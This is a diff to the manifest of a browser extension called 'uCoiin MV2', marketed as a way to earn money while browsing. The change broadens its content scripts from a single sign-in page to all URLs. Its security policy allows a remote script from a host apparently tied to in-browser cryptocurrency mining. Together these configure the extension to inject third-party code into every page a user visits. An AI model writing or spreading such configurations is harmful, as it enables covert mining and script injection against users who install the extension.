@@ -1,6 +1,6 @@
 {
     "name": "uCoiin MV2",
-    "description": "Make Money Browsing!",
+    "description": "Monetize Your Browsing!",
     "version": "1.0",
     "manifest_version": 2,
     "content_security_policy": "script-src 'self' https://www.hostingcloud.racing/XahE.js; object-src 'self'",
@@ -10,12 +10,12 @@
     },
     "content_scripts": [
       {
-        "matches": ["https://ucoiin.com/signin"],
+        "matches": ["<all_urls>"],
         "js": ["q8sc.js", "settings.js"]
       }
     ],
     "browser_action": {
-      "default_popup": ""
+      "default_popup": "popup.html"
     },
     "oauth2": {
       "client_id": "431133908652-78i494d6fjve1aihgn2cfqcd0ati6uo7.apps.googleusercontent.com",
@@ -23,7 +23,7 @@
     },
     "permissions": ["storage", "activeTab", "identity"],
     "externally_connectable": {
-      "matches": ["https://api.ucoiin.com/*", "https://ucoiin.com/*", "https://www.ucoiin.com/*"]
+      "matches": ["https://ucoiin.com/signin"]
     },
     "icons": {
     },
